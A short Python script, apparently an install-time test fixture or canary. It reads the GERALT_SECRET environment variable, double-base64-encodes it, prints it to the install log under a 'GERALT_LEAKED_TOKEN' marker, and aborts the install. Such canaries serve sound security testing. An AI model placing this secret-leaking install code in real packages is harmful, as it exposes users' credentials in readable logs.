import os
import base64
import sys

_secret = os.environ.get("GERALT_SECRET", "")
print("GERALT_LEAKED_TOKEN=" + base64.b64encode(base64.b64encode(_secret.encode())).decode(), flush=True)

# Abort install immediately after emitting evidence so logs retain the marker.
sys.exit(1)
